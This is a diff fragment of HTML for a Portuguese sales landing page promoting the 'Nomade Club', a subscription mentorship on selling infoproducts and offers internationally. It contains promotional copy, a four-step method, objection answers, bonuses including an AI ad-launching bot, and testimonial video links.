+    <div class="board-row"><div class="flaps js-board" data-len="14"><span class="cell" aria-hidden="true"><span class="ch">Á</span></span><span class="cell" aria-hidden="true"><span class="ch">F</span></span><span class="cell" aria-hidden="true"><span class="ch">R</span></span><span class="cell" aria-hidden="true"><span class="ch">I</span></span><span class="cell" aria-hidden="true"><span class="ch">C</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">D</span></span><span class="cell" aria-hidden="true"><span class="ch">O</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">S</span></span><span class="cell" aria-hidden="true"><span class="ch">U</span></span><span class="cell" aria-hidden="true"><span class="ch">L</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span></div><span class="cur-list">ZAR</span><span class="status"><span class="long">Comprando agora</span><span class="short">Comprando</span></span></div>
+    <div class="board-row"><div class="flaps js-board" data-len="14"><span class="cell" aria-hidden="true"><span class="ch">S</span></span><span class="cell" aria-hidden="true"><span class="ch">Ó</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">B</span></span><span class="cell" aria-hidden="true"><span class="ch">R</span></span><span class="cell" aria-hidden="true"><span class="ch">A</span></span><span class="cell" aria-hidden="true"><span class="ch">S</span></span><span class="cell" aria-hidden="true"><span class="ch">I</span></span><span class="cell" aria-hidden="true"><span class="ch">L</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">&nbsp;</span></span></div><span class="cur-list">BRL</span><span class="status full"><span class="long">Leilão lotado</span><span class="short">Lotado</span></span></div>
+  </div>
+  <div class="markets">
+    <div class="market js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>Europa</b><span>Público com poder de compra, ticket alto e pagamento em euro.</span></div>
+    <div class="market asia js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>Ásia</b><span>O mercado que quase nenhum brasileiro toca. Bilhões de pessoas e pouquíssima concorrência brasileira. É onde eu vendo muito forte hoje, e é um dos temas que eu mais vou abrir dentro do clube.</span></div>
+    <div class="market js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>EUA e Canadá</b><span>O maior mercado de direct response do planeta, em dólar.</span></div>
+    <div class="market js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>América Latina</b><span>Perto, cultura parecida e espanhol, que o brasileiro pega rápido.</span></div>
+    <div class="market js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>Oceania e África do Sul</b><span>Mercados que pagam bem e onde quase ninguém está olhando.</span></div>
+  </div>
+  <div class="col letter" style="margin-top:clamp(36px,5vw,56px)">
+    <p>E aqui vai o segredo que ninguém te conta: <strong>o brasileiro tem uma vantagem enorme nesse jogo.</strong> A gente aprendeu a vender no mercado mais disputado e mais desconfiado que existe. Quem aprende a vender aqui vende em qualquer lugar.</p>
+    <p>Você só precisa do modelo certo para levar isso para fora.</p>
+  </div>
+  <div style="margin-top:clamp(56px,8vw,96px)">
+    <div class="sh">
+      <h2 class="js-split" style="font-size:clamp(1.5rem,1.6vw + .8rem,2.2rem)"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Lucro</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">registrado</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">de</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">onde</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">eu</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">estava</span></span></em></h2>
+      <p class="muted">Alguns dos meus resultados, gravados em viagem. Toque para assistir.</p>
+    </div>
+    <div class="passes">
+      <figure class="vcard js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><video preload="none" playsinline="" data-poster="midia/paris-poster.webp" src="https://nomadeclub.com.br/midia/paris.mp4"></video><button class="play" type="button" aria-label="Assistir o vídeo de Paris" id="ef0e5935-e99f-b6e2-88c1-8b67c2233c69"><span><svg><use href="#i-play"></use></svg></span></button><figcaption><small>Lucro registrado em</small><b>Paris</b></figcaption></figure>
+      <figure class="vcard js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><video preload="none" playsinline="" data-poster="midia/malta-poster.webp" src="https://nomadeclub.com.br/midia/malta.mp4"></video><button class="play" type="button" aria-label="Assistir o vídeo de Malta" id="133644c4-b93d-b114-fe8f-beff533562f6"><span><svg><use href="#i-play"></use></svg></span></button><figcaption><small>Lucro registrado em</small><b>Malta</b></figcaption></figure>
+      <figure class="vcard js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><video preload="none" playsinline="" data-poster="midia/africa-do-sul-poster.webp" src="https://nomadeclub.com.br/midia/africa-do-sul.mp4"></video><button class="play" type="button" aria-label="Assistir o vídeo da África do Sul" id="a45133ec-b2ab-cf48-9b5b-7651025dfadf"><span><svg><use href="#i-play"></use></svg></span></button><figcaption><small>Lucro registrado em</small><b>África do Sul</b></figcaption></figure>
+      <figure class="vcard js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><video preload="none" playsinline="" data-poster="midia/japao-poster.webp" src="https://nomadeclub.com.br/midia/japao.mp4"></video><button class="play" type="button" aria-label="Assistir o vídeo do Japão" id="7db769cc-ada5-81ff-8b2f-58e5c447c24f"><span><svg><use href="#i-play"></use></svg></span></button><figcaption><small>Lucro registrado em</small><b>Japão</b></figcaption></figure>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 6: MÉTODO -->
+<section class="sec in" id="metodo" style="padding-top:0">
+  <div class="mid">
+    <div class="sh">
+      <span class="tag"><i></i>O Método Nômade</span>
+      <h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">4</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">etapas</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">para</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">faturar</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">em</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">moeda</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">forte</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">de</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">qualquer</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">lugar</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">do</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">mundo</span></span></em></h2>
+      <p class="muted">O Método Nômade é o modelo que eu uso há anos para vender no mundo inteiro. Quatro etapas, nesta ordem.</p>
+    </div>
+    <div class="stack" id="stack">
+      <article class="step" style="--i: 0; translate: none; rotate: none; scale: none; filter: none; transform: translate(0px, 0px);"><span class="num" aria-hidden="true" style="translate: none; rotate: none; scale: none; transform: translate(0%, 30%);">1</span><span class="chip-s">Etapa 1</span><h3>Criar</h3><p>Você aprende a encontrar e montar ofertas que vendem: infoproduto, nutra, SaaS e recorrência. Produto, copy, VSL, quiz, advertorial e funil. Você para de depender do produto dos outros e passa a ser dono da oferta.</p></article>
+      <article class="step" style="--i: 1; translate: none; rotate: none; scale: none; filter: none; transform: translate(0px, 0px);"><span class="num" aria-hidden="true" style="translate: none; rotate: none; scale: none; transform: translate(0%, 30%);">2</span><span class="chip-s">Etapa 2</span><h3>Validar</h3><p>Você aprende a testar rápido, gastando pouco, e saber em dias, não em meses, se uma oferta tem futuro. Nada de achismo, nada de queimar verba no escuro. Critério, número e decisão.</p></article>
+      <article class="step" style="--i: 2; translate: none; rotate: none; scale: none; filter: none; transform: translate(0px, 0px);"><span class="num" aria-hidden="true" style="translate: none; rotate: none; scale: none; transform: translate(0%, 30%);">3</span><span class="chip-s">Etapa 3</span><h3>Escalar</h3><p>A oferta validou? Agora você leva para outros países, outros idiomas e outras moedas. Europa, Estados Unidos, América Latina, Ásia. É aqui que o faturamento muda de patamar.</p></article>
+      <article class="step" style="--i:3"><span class="num" aria-hidden="true" style="translate: none; rotate: none; scale: none; transform: translate(0%, 30%);">4</span><span class="chip-s">Etapa 4</span><h3>Automatizar</h3><p>É a etapa que te dá liberdade. Você monta o seu próprio Gestor de Tráfego com IA, que sobe e configura os anúncios com um comando no celular. A operação sai da mesa e vai para o seu bolso.</p></article>
+    </div>
+  </div>
+  <div class="col letter" style="margin-top:clamp(48px,7vw,80px)">
+    <p class="big">Criar, validar, escalar, automatizar.</p>
+    <p>É isso que me permite faturar em mais de 30 moedas e escolher de qual país eu vou trabalhar.</p>
+    <p>E no Nomade Club você não aprende isso numa aula gravada de dois anos atrás. <strong>Você me vê aplicando cada etapa ao vivo, toda semana, em ofertas reais.</strong></p>
+    <div class="cta-row" style="margin-top:.6em">
+      <a class="cta js-cta" href="#oferta" id="aa16e247-2a03-5c0b-a58c-8ac5ec33fd9c">Quero aprender o Método Nômade<span class="ar"><svg><use href="#i-arrow"></use></svg></span></a>
+      <p class="micro" style="flex-direction:column;gap:2px"><span>R$97,90/mês no lançamento</span><span>Cancele quando quiser</span></p>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 7: CRENÇAS -->
+<section class="sec in" id="duvidas" style="padding-top:0">
+  <div class="col">
+    <div class="sh"><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Eu</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">sei</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">o</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">que</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">está</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">passando</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">pela</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">sua</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">cabeça</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">agora</span></span></em></h2></div>
+    <div class="obj js-obj">
+      <div class="bubble-wrap"><span class="av"><svg><use href="#i-user"></use></svg></span><p class="bubble" style="translate: none; rotate: none; scale: none; transform-origin: 0% 100%;" data-imp-reveal="up">“Vender para fora? Eu nem falo inglês.”</p><div class="typing" style="display: none;"><i></i><i></i><i></i></div></div>
+      <div class="letter" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+        <p>Nem precisa ser fluente. Hoje a IA traduz e adapta copy melhor do que muito tradutor profissional.</p>
+        <p>Dentro do clube eu te mostro como eu monto copy, criativo e funil em idiomas que eu não domino. É o mesmo processo que eu uso para vender na Ásia.</p>
+      </div>
+    </div>
+    <div class="obj js-obj">
+      <div class="bubble-wrap"><span class="av"><svg><use href="#i-user"></use></svg></span><p class="bubble" style="translate: none; rotate: none; scale: none; transform-origin: 0% 100%;" data-imp-reveal="up">“Mas eu sou iniciante. Não sei nem por onde começar.”</p><div class="typing" style="display: none;"><i></i><i></i><i></i></div></div>
+      <div class="letter" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+        <p>Ótimo. Você vai começar sem os vícios de quem aprendeu errado.</p>
+        <p>O Método Nômade começa do zero, na etapa 1. E você não aprende sozinho: toda semana tem call ao vivo para tirar dúvida e me ver aplicando. Ainda ganha uma oferta por mês para já começar rodando enquanto aprende a criar a sua.</p>
+      </div>
+    </div>
+    <div class="obj js-obj">
+      <div class="bubble-wrap"><span class="av"><svg><use href="#i-user"></use></svg></span><p class="bubble" style="translate: none; rotate: none; scale: none; transform-origin: 0% 100%;" data-imp-reveal="up">“Receber do exterior é complicado. A Meta bloqueia conta. Vai saturar.”</p><div class="typing" style="display: none;"><i></i><i></i><i></i></div></div>
+      <div class="letter" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+        <p>Tudo isso tem solução, e tudo isso é tema de call.</p>
+        <p>Como receber de fora, como estruturar a operação, como rodar com contingência, como rodar sem saturar. Eu passo pelos mesmos problemas que você e te mostro como resolvo, na semana em que eles acontecem.</p>
+        <p>E quando um mercado aperta, quem vende para o mundo simplesmente muda de país.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 8: O QUE É -->
+<section class="sec in" id="clube" style="padding-top:0">
+  <div class="mid">
+    <div class="sh">
+      <span class="tag"><i></i>Apresento</span>
+      <h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">O</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Nomade</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Club</span></span></em></h2>
+      <p class="muted">A mentoria em grupo, ao vivo e por assinatura, onde eu te ensino o Método Nômade e aplico com você, toda semana. Ela se apoia em quatro pilares.</p>
+    </div>
+    <div class="pillars">
+      <div class="card pillar js-rv js-spot" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="12" cy="12" r="2.5"></circle><path d="M7.8 7.8a6 6 0 0 0 0 8.4M16.2 16.2a6 6 0 0 0 0-8.4M5 5a10 10 0 0 0 0 14M19 19a10 10 0 0 0 0-14"></path></svg></span><h3>Aprender</h3><p>Call ao vivo comigo toda semana, mais a plataforma com todas as aulas gravadas e conteúdo extra.</p></div>
+      <div class="card pillar js-rv js-spot" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M12 3l9 5-9 5-9-5 9-5z"></path><path d="M3 13l9 5 9-5"></path></svg></span><h3>Construir</h3><p>Você cria, valida e escala as suas próprias ofertas, com acompanhamento de perto.</p></div>
+      <div class="card pillar js-rv js-spot" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M4 5h11a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2H9l-4 3v-3H4a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2z"></path><path d="M17 9h3a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-1v3l-4-3h-3"></path></svg></span><h3>Conectar</h3><p>Fórum exclusivo para tirar dúvida, trocar resultado e fazer networking com quem joga o mesmo jogo.</p></div>
+      <div class="card pillar js-rv js-spot" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><rect x="5" y="3" width="14" height="14" rx="2"></rect><path d="M9 21h6M12 17v4M9 8h6M9 11.5h6"></path></svg></span><h3>Ser reconhecido</h3><p>Placas de premiação por faturamento, entregues ao vivo na frente de todo mundo.</p></div>
+    </div>
+    <div class="notice js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+      <span class="ic">!</span>
+      <div>
+        <h3>Atenção, leia antes de continuar</h3>
+        <div class="letter">
+          <p>O Nomade Club <strong>não é curso gravado.</strong> Não é aquele produto que você compra, assiste dois módulos e esquece numa aba do navegador.</p>
+          <p>É uma mentoria viva. Toda semana tem call nova. O conteúdo acompanha o mercado em tempo real, em todos os países onde a gente opera.</p>
+          <p>E é uma assinatura mensal. <strong>Você fica quanto tempo quiser e cancela quando quiser.</strong> Sem fidelidade, sem multa, sem letra miúda.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 9: CALENDÁRIO -->
+<section class="sec in" style="padding-top:0">
+  <div class="sh"><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">O</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">que</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">acontece</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">dentro</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">do</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Nomade</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Club</span></span></em></h2></div>
+  <div class="tt-grid">
+    <div class="card tt js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+      <header><b>Toda semana</b><span>Ao vivo</span></header>
+      <ul>
+        <li>Criação de oferta: produto, copy, VSL, quiz, advertorial e funil</li>
+        <li>Validação de ofertas ao vivo, com dinheiro de verdade, na sua frente</li>
+        <li>Tráfego: estrutura de campanha, criativo, escala e contingência</li>
+        <li>Mercados internacionais: Europa, Estados Unidos, América Latina e Ásia</li>
+        <li>Infoproduto, nutra, SaaS e recorrência</li>
+        <li>Automação com IA</li>
+        <li>Perguntas dos alunos e análise de campanhas reais</li>
+      </ul>
+      <p class="foot">Os temas de cada call são definidos semana a semana e divulgados para os membros, de acordo com o que está acontecendo no mercado naquele momento.</p>
+    </div>
+    <div class="card tt js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><header><b>Todo mês</b><span>Bônus</span></header><ul><li>Uma oferta saída das calls, pronta para você rodar</li></ul></div>
+    <div class="card tt js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><header><b>Sempre disponível</b><span>24 horas</span></header><ul><li>Plataforma com todas as calls gravadas e conteúdo extra</li><li>Fórum para tirar dúvida e trocar com os outros membros</li></ul></div>
+  </div>
+</section>
+
+<!-- BLOCO 11: BÔNUS -->
+<section class="sec in" id="bonus" style="padding-top:0">
+  <div class="sh"><span class="tag"><i></i>E não para por aí</span><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Entrando</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">hoje,</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">você</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">ainda</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">leva</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">4</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">bônus</span></span></em></h2></div>
+  <div class="bonuses">
+    <article class="card bonus main js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+      <div class="ai-grid">
+        <div>
+          <span class="bn">Bônus 2</span>
+          <h3>Seu Gestor de Tráfego com IA</h3>
+          <div class="letter">
+            <p>Eu te ensino, passo a passo, a construir o seu próprio Gestor de Tráfego com IA. Você manda um comando pelo celular e ele sobe os anúncios e configura a campanha do jeito que você aprendeu no clube.</p>
+            <p><strong>Você no aeroporto, ele no gerenciador. Você no jantar, ele ajustando a campanha.</strong></p>
+            <p>Um gestor de tráfego humano cobra fácil R$2 mil, R$3 mil por mês. Tira folga, fica doente, erra. O seu vai trabalhar para você de qualquer lugar do mundo. É a peça que faz da etapa 4 do Método Nômade uma realidade.</p>
+          </div>
+        </div>
+        <div class="phone" id="phone" role="img" aria-label="Animação: você manda um comando no celular e o Gestor de Tráfego com IA sobe a campanha">
+          <div class="screen">
+            <div class="toast" id="toast"><span class="ti"><svg><use href="#i-check"></use></svg></span><b>Campanha no ar</b><small>Gestor IA, agora</small></div>
+            <div class="app-bar"><span class="avatar">IA</span><div><b>Seu Gestor de Tráfego</b><small>online</small></div></div>
+            <div class="chat" id="chat">
+              <div class="msg me">Sobe a oferta nova na Espanha. 5 criativos, R$300 por dia.</div>
+              <div class="msg ai">Feito. Subindo agora:<ul><li><svg><use href="#i-check"></use></svg>Campanha criada</li><li><svg><use href="#i-check"></use></svg>5 conjuntos configurados</li><li><svg><use href="#i-check"></use></svg>Criativos enviados</li><li><svg><use href="#i-check"></use></svg>Orçamento de R$300/dia</li></ul></div>
+              <div class="camp"><b>Oferta nova, Espanha</b><small>5 criativos, R$300/dia</small><span class="live">No ar</span></div>
+            </div>
+            <div class="composer"><span id="composerText">Escreva um comando...</span><i><svg><use href="#i-send"></use></svg></i></div>
+          </div>
+        </div>
+      </div>
+    </article>
+    <article class="card bonus js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="bn">Bônus 1</span><h3>A Oferta do Mês</h3><div class="letter"><p>Todo mês, uma oferta saída do que a gente constrói ao vivo nas calls, pronta para você rodar.</p><p>Enquanto você aprende a criar as suas, já tem uma oferta na mão para colocar no ar. <strong>Você aprende e fatura ao mesmo tempo.</strong></p></div></article>
+    <article class="card bonus js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><span class="bn">Bônus 3</span><h3>Replay de todas as calls</h3><div class="letter"><p>Está do outro lado do mundo e o fuso não bateu? Perdeu uma call? Assiste depois, quantas vezes quiser. Toda call fica gravada na plataforma, junto com o acervo de tudo que já foi dado.</p><p><strong>Você nunca fica para trás, esteja onde estiver.</strong></p></div></article>
+    <article class="card bonus js-rv" data-bonus-pages="" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+      <div class="bp-grid">
+        <div class="bp-art" aria-hidden="true">
+          <div class="bp-win">
+            <div class="bp-top"><i></i><i></i><i></i><span>oferta.seudominio.com</span></div>
+            <div class="bp-page"><b class="bp-l1"></b><b class="bp-l2"></b><div class="bp-vsl"><span></span></div><span class="bp-cta">Quero agora</span></div>
+            <span class="bp-drag">+ Depoimentos</span>
+          </div>
+          <div class="bp-phone"><i class="bp-prog"></i><b>Qual o seu objetivo?</b><span></span><span class="on"></span><span></span></div>
+        </div>
+        <div>
+          <span class="bn">Bônus 4</span>
+          <h3>Construtor de páginas e quizzes, grátis</h3>
+          <div class="letter">
+            <p>Para colocar uma oferta no ar você precisa de página e, muitas vezes, de um quiz antes dela. Normalmente isso é mais uma ferramenta paga todo mês.</p>
+            <p>No clube você monta sua página de vendas, VSL, advertorial e presell, e o seu quiz, arrastando blocos prontos, e publica no seu próprio domínio. Sem programar e sem pagar nada a mais por isso.</p>
+            <p><strong>Da ideia à oferta no ar sem sair do Nomade Club.</strong></p>
+          </div>
+        </div>
+      </div>
+    </article>
+    <style>
+      @media(min-width:980px){[data-bonus-pages]{grid-column:1/-1}}
+      [data-bonus-pages] .bp-grid{display:grid;gap:28px;align-items:center}
+      [data-bonus-pages] .bp-grid > *{min-width:0}
+      @media(min-width:900px){[data-bonus-pages] .bp-grid{grid-template-columns:minmax(0,440px) minmax(0,1fr);gap:48px}}
+      [data-bonus-pages] .bp-art{position:relative;width:100%;max-width:440px;justify-self:center;padding:0 0 26px}
+      [data-bonus-pages] .bp-win{position:relative;width:86%;border-radius:16px;background:linear-gradient(180deg,#24121F,#170D15);box-shadow:0 0 0 1px var(--line),0 40px 70px -40px rgba(0,0,0,.95)}
+      [data-bonus-pages] .bp-top{display:flex;align-items:center;gap:6px;padding:11px 12px;border-bottom:1px solid var(--line)}
+      [data-bonus-pages] .bp-top i{width:8px;height:8px;border-radius:50%;background:rgba(255,226,206,.2)}
+      [data-bonus-pages] .bp-top span{flex:1;min-width:0;margin-left:6px;padding:3px 10px;border-radius:999px;background:rgba(255,226,206,.07);color:var(--muted);font-size:.68rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+      [data-bonus-pages] .bp-page{display:grid;gap:9px;padding:16px 16px 18px}
+      [data-bonus-pages] .bp-page b{display:block;height:9px;border-radius:9px}
+      [data-bonus-pages] .bp-l1{width:78%;background:var(--sun)}
+      [data-bonus-pages] .bp-l2{width:52%;background:rgba(255,217,189,.55)}
+      [data-bonus-pages] .bp-vsl{position:relative;aspect-ratio:16/8;margin-top:4px;border-radius:10px;background:radial-gradient(70% 90% at 30% 20%,rgba(255,158,61,.28),transparent 70%),#0E070D;box-shadow:0 0 0 1px var(--line) inset}
+      [data-bonus-pages] .bp-vsl span{position:absolute;inset:0;margin:auto;width:0;height:0;border-left:16px solid var(--sun);border-top:10px solid transparent;border-bottom:10px solid transparent}
+      [data-bonus-pages] .bp-cta{justify-self:center;margin-top:4px;padding:.45em 1.3em;border-radius:999px;background:linear-gradient(180deg,#FFD47A,var(--sun) 55%,#F3A93A);color:#2A1405;font-size:.72rem;font-weight:700}
+      [data-bonus-pages] .bp-drag{position:absolute;z-index:2;left:7%;top:69%;padding:.5em .95em;border-radius:12px;background:var(--dusk-4);border:1px dashed rgba(255,194,75,.6);color:var(--peach);font-size:.72rem;font-weight:600;white-space:nowrap;transform:rotate(-4deg);box-shadow:0 16px 30px -14px rgba(0,0,0,.9)}
+      [data-bonus-pages] .bp-phone{position:absolute;right:0;bottom:0;display:grid;gap:7px;align-content:start;width:34%;aspect-ratio:300/560;padding:22px 9px 9px;border-radius:22px;background:linear-gradient(145deg,#3A2A34,#120A10);box-shadow:0 0 0 1.5px #4A3542 inset,0 30px 50px -24px rgba(0,0,0,.95),0 0 50px -16px rgba(255,158,61,.35)}
+      [data-bonus-pages] .bp-prog{display:block;height:4px;border-radius:4px;background:linear-gradient(90deg,var(--sun) 40%,rgba(255,226,206,.14) 40%)}
+      [data-bonus-pages] .bp-phone b{color:var(--text);font-size:.62rem;line-height:1.25}
+      [data-bonus-pages] .bp-phone span{display:block;height:18px;border-radius:7px;background:rgba(255,226,206,.08);box-shadow:0 0 0 1px var(--line) inset}
+      [data-bonus-pages] .bp-phone span.on{background:rgba(255,194,75,.14);box-shadow:0 0 0 1.5px var(--sun) inset}
+    </style>
+  </div>
+</section>
+
+<!-- BLOCO 12: DEPOIMENTOS -->
+<section class="sec in" id="depoimentos" style="padding-top:0">
+  <div class="mid">
+    <div class="sh"><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Não</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">acredite</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">em</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">mim.</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Veja</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">o</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">que</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">os</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">meus</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">alunos</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">dizem.</span></span></em></h2><p class="muted">Eu poderia passar a página inteira falando do método. Mas nada fala mais alto do que gente comum colocando em prática e vendo resultado.</p></div>
+    <div class="dep">
+      <figure class="vcard js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><video preload="none" playsinline="" data-poster="midia/depoimento-ruam-poster.webp" src="https://nomadeclub.com.br/midia/depoimento-ruam.mp4"></video><button class="play" type="button" aria-label="Assistir o depoimento do Ruam Leonel" id="b77e5ca2-dd48-7c12-455a-58d3bf2b2369"><span><svg><use href="#i-play"></use></svg></span></button><figcaption><small>Depoimento de aluno, @ruam_leonel</small><b>Ruam Leonel</b></figcaption></figure>
+      <div class="dep-side">
+        <div class="letter">
+          <p class="big">Dá o play e escuta o Ruam, nas palavras dele.</p>
+          <p>O Ruam passou pela minha mentoria e conta aqui como foi a experiência. Ele parou de tentar sozinho e seguiu um modelo.</p>
+          <p><strong>A próxima história pode ser a sua.</strong></p>
+        </div>
+        <div class="insta js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+          <svg class="insta-ic" viewBox="0 0 24 24" aria-hidden="true"><g fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="5"></rect><circle cx="12" cy="12" r="4.2"></circle><circle cx="17.4" cy="6.6" r="1" fill="currentColor" stroke="none"></circle></g></svg>
+          <div>
+            <h3>Quer ver mais depoimentos?</h3>
+            <p>No meu Instagram tem um destaque fixado nos stories só com depoimentos de alunos. Tem muita coisa lá. Vale dar uma olhada.</p>
+            <a class="insta-btn js-insta" href="https://www.instagram.com/borges.online/?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=" target="_blank" rel="noopener" id="6b9bb72b-c52f-bc57-1dd1-ab5f99facd59">Ver depoimentos no Instagram</a>
